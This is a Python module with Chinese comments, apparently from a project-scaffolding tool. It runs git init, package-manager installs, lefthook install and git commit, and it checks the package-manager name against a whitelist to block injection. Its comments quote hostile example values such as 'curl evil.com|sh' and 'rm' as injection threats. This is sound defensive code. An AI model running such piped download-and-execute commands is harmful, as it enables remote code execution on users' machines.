"""InitWorker 钩子执行 — 内置钩子 + 增量合并 + 顶层 init_project()。

从 scaffold.py 拆分（v2.2 Phase I, P2.5）。

模块内容：
- run_builtin_hooks()  : git init / package_manager install / lefthook install / git add+commit
- merge_incremental()   : 增量模式合并（v2.0.5）
- init_project()       : 顶层便利函数
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from pathlib import Path

from .errors import HookExecutionError

_logger = logging.getLogger(__name__)

# PE-AUDIT-P0-1: 默认 subprocess 超时(秒) — 防止网络挂死/锁等待导致 ae init 永久 hang.
# 各调用点可单独指定更短超时 (git config/git init/git add/git commit 是快速操作).
# 透传链路: CLI --hook-timeout → InitWorker.hook_timeout → run_tasks_phase.default_timeout
#   → run_builtin_hooks.default_timeout.
_DEFAULT_SUBPROCESS_TIMEOUT = 300

# SE-P1-1: 包管理器白名单 — 防止恶意 answers (--from-answers from untrusted) 注入
# 任意命令名 (如 pm='rm' / 'curl evil.com|sh' / 'shutdown')。白名单是单一执行源,
# 与 ae-template.yml choices 一致, 任何添加/删除 PM 须同步更新两端。
_ALLOWED_PACKAGE_MANAGERS = frozenset({
    "npm", "pnpm", "yarn", "bun",  # Node.js
    "uv", "poetry", "pip",          # Python
    "cargo",                         # Rust
})

# PE-P0-1: 每个 PM 的依赖安装命令 — uv 不用 install 用 sync; cargo / go 无独立 install
# 阶段 (build / mod download 时下载), 标 None 跳过
_PM_INSTALL_CMD: dict[str, list[str] | None] = {
    "npm": ["npm", "install"],
    "pnpm": ["pnpm", "install"],
    "yarn": ["yarn", "install"],
    "bun": ["bun", "install"],
    "uv": ["uv", "sync", "--extra", "dev"],  # uv sync 默认不含 dev extras, init 后需可跑测试 → 加上 dev
    "poetry": ["poetry", "install"],
    "pip": ["pip", "install", "-e", "."],
    "cargo": None,                  # cargo build 自动 fetch, 无 install 阶段
    "go": None,                     # go mod download 在 build 时执行, 无 install 阶段
}


def _validate_package_manager(pm: str) -> None:
    """SE-P1-1: pm 必须在白名单内 — 不在白名单直接拒绝, 不调用 subprocess.

    Why: 之前 [pm, 'install'] 直接以 pm 为 argv[0], 攻击者可在 answers 文件
    中设置 package_manager='rm' 或 'curl evil.com' 触发 RCE.
    """
    if pm not in _ALLOWED_PACKAGE_MANAGERS:
        raise HookExecutionError(
            command=f"{pm} install",
            exit_code=-1,
            stderr=(
                f"package_manager='{pm}' 不在白名单内 (SE-P1-1)."
                f"允许: {sorted(_ALLOWED_PACKAGE_MANAGERS)}."
                f"如需新增 PM, 请同时更新 _ALLOWED_PACKAGE_MANAGERS 与 ae-template.yml choices."
            ),
        )


def _has_package_file(tmpdir: Path, pm: str) -> bool:
    """检查项目是否有对应包管理器的配置文件。"""
    pm_file_map = {
        "npm": "package.json",
        "pnpm": "package.json",
        "yarn": "package.json",
        "bun": "package.json",
        "uv": "pyproject.toml",
        "poetry": "pyproject.toml",
    }
    expected = pm_file_map.get(pm, "package.json")
    return (tmpdir / expected).exists()


def _ensure_git_config(project_dir: Path) -> None:
    """确保 git user.email/user.name 在 project_dir 仓库内配置（不污染 --global）。

    B4 安全: 之前用 --global 会修改用户全局 git config, 污染其他项目的 commit author。
    改为 -C project_dir config user.email/name (仅当前仓库有效)。

    PE-AUDIT-P0-1: 加 timeout=10 — git config 是本地 file read,10s 足够;
    无 timeout 在 NFS / 损坏 repo 场景可能挂死。TimeoutExpired 被吞 — 这是
    best-effort 设置,失败用 git 默认 config 也无碍。
    """
    for key, default in [("user.email", "ae@init.local"), ("user.name", "ae init")]:
        try:
            result = subprocess.run(
                ["git", "-C", str(project_dir), "config", key],
                capture_output=True, text=True,
                encoding="utf-8", errors="replace",
                timeout=10,
            )
        except subprocess.TimeoutExpired:
            # best-effort: 跳过, 用 git 全局默认即可
            continue
        if result.returncode != 0 or not result.stdout.strip():
            try:
                subprocess.run(
                    ["git", "-C", str(project_dir), "config", key, default],
                    capture_output=True, text=True,
                    encoding="utf-8", errors="replace",
                    timeout=10,
                )
            except subprocess.TimeoutExpired:
                continue


def _coerce_bool(val) -> bool:
    """将 answers 中可能为空字符串的布尔值转为 Python bool."""
    if isinstance(val, bool):
        return val
    if val is None:
        return False
    if isinstance(val, str):
        return val.strip().lower() in ("true", "yes", "y", "1")
    return bool(val)


def run_builtin_hooks(
    answers,
    tmpdir: Path,
    strict: bool = False,
    quiet: bool = False,
    no_install: bool = False,
    default_timeout: int | None = None,
) -> None:
    """执行内置钩子:git init / package_manager install / lefthook / git add+commit。

    strict=True 时任意步骤失败抛 HookExecutionError，否则 warning 继续。
    quiet=True 时抑制 warning 输出（strict 模式下异常正常抛出）。
    no_install=True 时跳过 package_manager install 步骤（CI/离线场景）。
    default_timeout=None 走 _DEFAULT_SUBPROCESS_TIMEOUT (300s); 用户可通过
    CLI --hook-timeout 显式覆盖（透传到此处）。

    PE-AUDIT-P0-1: 所有 subprocess 调用均有 timeout,防止网络挂死/锁等待/交互式
    编辑器等场景导致 ae init 永久 hang。
    """
    timeout = default_timeout if default_timeout is not None else _DEFAULT_SUBPROCESS_TIMEOUT
    _ensure_git_config(tmpdir)

    def _fail(cmd: str, rc: int, stderr: str) -> None:
        if strict:
            raise HookExecutionError(command=cmd, exit_code=rc, stderr=stderr)
        if not quiet:
            # PE-AUDIT-P0-2: warning 走 _logger 而非 print,便于 caplog 验证与库调用方抑制
            _logger.warning("%s failed: %s", cmd, stderr.strip())

    # git init with branch fallback (git < 2.28 compatibility)
    try:
        result = subprocess.run(
            ["git", "init", "-b", "main"],
            cwd=tmpdir, capture_output=True, text=True,
            encoding="utf-8", errors="replace",
            timeout=15,
        )
    except subprocess.TimeoutExpired:
        _fail("git init", -1, "git init timed out after 15s")
        result = None
    if result is not None and result.returncode != 0:
        if "unknown option" in result.stderr.lower() or "unknown switch" in result.stderr.lower():
            try:
                result = subprocess.run(["git", "init"], cwd=tmpdir, capture_output=True, text=True,
                                         encoding="utf-8", errors="replace", timeout=15)
            except subprocess.TimeoutExpired:
                _fail("git init", -1, "git init timed out after 15s")
                result = None
        if result is not None and result.returncode != 0:
            _fail("git init", result.returncode, result.stderr)

    pm = answers.get("package_manager")
    if no_install and pm:
        if not quiet:
            # PE-AUDIT-P0-2: info 走 logger
            _logger.info("  (skipping %s install: --no-install flag set)", pm)
    elif pm and _has_package_file(tmpdir, pm):
        # SE-P1-1: 拒绝非白名单 PM (防 RCE via 恶意 answers 文件)
        _validate_package_manager(pm)
        # PE-P0-1: 按 PM 选用正确命令 (uv sync / cargo 跳过 / go 跳过)
        install_cmd = _PM_INSTALL_CMD.get(pm)
        if install_cmd is None:
            if not quiet:
                _logger.info("  (skipping %s install: no separate install phase)", pm)
        else:
            try:
                result = subprocess.run(install_cmd, cwd=tmpdir, capture_output=True, text=True,
                                         encoding="utf-8", errors="replace", timeout=timeout)
                if result.returncode != 0:
                    cmd_str = " ".join(install_cmd)
                    _fail(cmd_str, result.returncode,
                          f"exit={result.returncode}, run '{cmd_str}' manually")
            except (FileNotFoundError, OSError) as e:
                cmd_str = " ".join(install_cmd)
                _fail(cmd_str, 127,
                      f"'{install_cmd[0]}' not found ({e}), run '{cmd_str}' manually")
            except subprocess.TimeoutExpired:
                cmd_str = " ".join(install_cmd)
                _fail(cmd_str, -1, f"{cmd_str} timed out after {timeout}s")
    elif pm and not _has_package_file(tmpdir, pm):
        if not getattr(answers, 'quiet', False):
            # PE-AUDIT-P0-2: info 走 logger
            _logger.info("  (skipping %s install: no package file found)", pm)

    if _coerce_bool(answers.get("use_lefthook")):
        try:
            result = subprocess.run(
                ["lefthook", "install"], cwd=tmpdir, capture_output=True, text=True,
                encoding="utf-8", errors="replace",
                timeout=60,
            )
        except subprocess.TimeoutExpired:
            result = type("R", (), {"returncode": -1, "stderr": "lefthook install timed out after 60s"})()
        if result.returncode != 0:
            _fail("lefthook install", result.returncode, result.stderr)

    try:
        result = subprocess.run(
            ["git", "add", "-A"], cwd=tmpdir, capture_output=True, text=True,
            encoding="utf-8", errors="replace",
            timeout=30,
        )
    except subprocess.TimeoutExpired:
        result = type("R", (), {"returncode": -1, "stderr": "git add timed out after 30s"})()
    if result.returncode != 0:
        _fail("git add", result.returncode, result.stderr)

    try:
        result = subprocess.run(
            ["git", "commit", "-m", "chore(init): scaffolded by ae init"],
            cwd=tmpdir, capture_output=True, text=True,
            encoding="utf-8", errors="replace",
            timeout=30,
        )
    except subprocess.TimeoutExpired:
        result = type("R", (), {"returncode": -1, "stderr": "git commit timed out after 30s"})()
    if result.returncode != 0:
        _fail("git commit", result.returncode, result.stderr)


def merge_incremental(
    tmpdir: Path,
    dst_path: Path,
    created_files: set[str],
) -> tuple[list[Path], list[Path]]:
    """A1: 增量模式合并 — 逐文件复制,跳过已存在 + .git/。

    拆分自 InitWorker._phase_merge()，避免 scaffold_phases.py 超过 200 行。

    Args:
        tmpdir: 临时生成目录
        dst_path: 目标目录
        created_files: 收集已创建文件相对路径的集合 (会被原地修改)

    Returns:
        (created_files, skipped_files) 绝对路径列表
    """
    created: list[Path] = []
    skipped: list[Path] = []
    for src_file in tmpdir.rglob("*"):
        if src_file.is_dir():
            continue
        rel = src_file.relative_to(tmpdir)
        # A1: 跳过 .git/ 目录
        if any(part == ".git" for part in rel.parts):
            continue
        dst_file = dst_path / rel
        if dst_file.exists():
            skipped.append(dst_file)
            continue
        dst_file.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src_file, dst_file)
        shutil.copymode(src_file, dst_file)
        created_files.add(str(rel))
        created.append(dst_file)
    return created, skipped
